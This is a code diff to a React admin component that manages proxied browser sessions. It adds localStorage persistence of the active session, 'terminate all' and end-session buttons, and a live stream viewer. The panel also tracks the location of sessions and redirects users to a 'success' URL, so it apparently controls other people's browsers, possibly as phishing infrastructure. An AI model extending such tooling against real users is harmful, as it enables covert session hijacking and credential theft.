@@ -1,6 +1,6 @@
 "use client";
 
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import LiveStreamViewer from "@/components/LiveStreamViewer";
 
 export default function ProxyAndStreamManager() {
@@ -39,6 +39,26 @@ export default function ProxyAndStreamManager() {
 
   const [redirectUrl, setRedirectUrl] = useState("https://success-portal.com/complete");
   const [redirecting, setRedirecting] = useState(false);
+
+  // 🔥 1. Ghost Session Fix & LocalStorage Sync on Component Mount
+  useEffect(() => {
+    const savedSessionId = localStorage.getItem("rbi_active_session_id");
+    if (savedSessionId) {
+      setActiveSessionId(savedSessionId);
+    }
+    
+    // Refresh par backend se sessions fetch karna
+    const fetchSessions = async () => {
+      try {
+        const res = await fetch("/api/admin/sessions");
+        const data = await res.json();
+        if (data.success && Array.isArray(data.sessions)) {
+          setSessions(data.sessions);
+        }
+      } catch (err) {}
+    };
+    fetchSessions();
+  }, []);
 
   const handleEmbedProxy = async () => {
     if (!proxyEnabled || !ip || !port) {
@@ -100,6 +120,7 @@ export default function ProxyAndStreamManager() {
 
         setSessions(prev => [newSession, ...prev]);
         setActiveSessionId(data.sessionId);
+        localStorage.setItem("rbi_active_session_id", data.sessionId);
         
         await fetch("/api/admin/session/select", {
           method: "POST",
@@ -121,22 +142,44 @@ export default function ProxyAndStreamManager() {
   const handleEndSession = async (sessionId: string) => {
     if (!confirm("Terminate this active session?")) return;
     try {
-      const res = await fetch("/api/admin/session/stop", {
+      const res = await fetch("/api/admin/session/terminate", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ redirectUrl, sessionId }),
+        body: JSON.stringify({ sessionId }),
       });
       const data = await res.json();
-      if (data.success || res.ok) {
+      if (res.ok) {
         setSessions(prev => prev.filter(s => s.id !== sessionId));
-        if (activeSessionId === sessionId) setActiveSessionId(null);
+        if (activeSessionId === sessionId) {
+          setActiveSessionId(null);
+          localStorage.removeItem("rbi_active_session_id");
+        }
         alert("Session terminated successfully!");
       }
-    } catch (err) {}
+    } catch (err) {
+      alert("Failed to terminate session.");
+    }
   };
 
-  // 🔥 Is function ko humne update kar diya hai taaki click hote hi popup close aur redirect signal bhej de
-const handleRedirectUser = async () => {
+  // 🔥 Master Terminate All Sessions Function
+  const handleTerminateAll = async () => {
+    if (!confirm("Kya aap waqai saare active sessions ko terminate karna chahte hain?")) return;
+    try {
+      await fetch("/api/admin/session/terminate", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ terminateAll: true }),
+      });
+      setSessions([]);
+      setActiveSessionId(null);
+      localStorage.removeItem("rbi_active_session_id");
+      alert("All sessions terminated successfully!");
+    } catch (err) {
+      alert("Failed to terminate all sessions.");
+    }
+  };
+
+  const handleRedirectUser = async () => {
     if (!redirectUrl) {
       alert("Please enter a valid redirect URL.");
       return;
@@ -369,13 +412,33 @@ const handleRedirectUser = async () => {
       {/* Active Browser Sessions Table */}
       <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-5 shadow-xl space-y-4">
         <div className="flex items-center justify-between">
-          <h2 className="text-sm font-bold text-zinc-200">Active Browser Sessions & Location Tracking</h2>
-          <span className="text-[10px] text-zinc-400 bg-zinc-950 px-3 py-1 rounded-full border border-zinc-800">
-            Active Sessions: {sessions.length}
-          </span>
+          <div className="flex items-center gap-3">
+            <h2 className="text-sm font-bold text-zinc-200">Active Browser Sessions & Location Tracking</h2>
+            <span className="text-[10px] text-zinc-400 bg-zinc-950 px-3 py-1 rounded-full border border-zinc-800">
+              Active Sessions: {sessions.length}
+            </span>
+          </div>
+          {sessions.length > 0 && (
+            <button 
+              onClick={handleTerminateAll}
+              className="bg-rose-600 hover:bg-rose-700 text-white px-3 py-1.5 rounded-xl text-xs font-bold transition shadow cursor-pointer"
+            >
+              Terminate All Sessions
+            </button>
+          )}
         </div>
         {sessions.length === 0 ? (
-          <p className="text-xs text-zinc-500 py-6 text-center">Koi active session maujood nahi hai. Upar diye gaye form se naya session launch karein.</p>
+          <div className="flex items-center justify-between py-6">
+            <p className="text-xs text-zinc-500">Koi active session table mein nahi hai (Lekin background mein chal raha ho sakta hai).</p>
+            {activeSessionId && (
+              <button 
+                onClick={() => handleEndSession(activeSessionId)}
+                className="bg-rose-600 hover:bg-rose-700 text-white px-3 py-1.5 rounded-xl text-xs font-bold transition cursor-pointer"
+              >
+                End Active Session ({activeSessionId})
+              </button>
+            )}
+          </div>
         ) : (
           <div className="overflow-x-auto">
             <table className="w-full text-left text-xs">
@@ -411,6 +474,8 @@ const handleRedirectUser = async () => {
                           onClick={async () => {
                             setConnectingSessionId(sess.id);
                             setActiveSessionId(sess.id);
+                            localStorage.setItem("rbi_active_session_id", sess.id);
+                            
                             await fetch("/api/admin/session/select", {
                               method: "POST",
                               headers: { "Content-Type": "application/json" },
@@ -459,12 +524,20 @@ const handleRedirectUser = async () => {
       </div>
 
       {/* Live Stream Viewport Container */}
-      <div className="mt-6">
-        <h2 className="text-sm font-bold text-zinc-200 mb-3">
+      <div className="mt-6 flex items-center justify-between mb-3">
+        <h2 className="text-sm font-bold text-zinc-200">
           {activeSessionId ? `Live Stream Viewport (Active Session: ${activeSessionId})` : "Live Stream Viewport (Session select karne ke liye table par click karein)"}
         </h2>
-        <LiveStreamViewer activeSessionId={activeSessionId} />
+        {activeSessionId && (
+          <button 
+            onClick={() => handleEndSession(activeSessionId)}
+            className="bg-rose-600 hover:bg-rose-700 text-white px-3 py-1 rounded text-xs font-bold transition cursor-pointer shadow"
+          >
+            🛑 End Current Session ({activeSessionId})
+          </button>
+        )}
       </div>
+      <LiveStreamViewer activeSessionId={activeSessionId} />
 
     </div>
   );
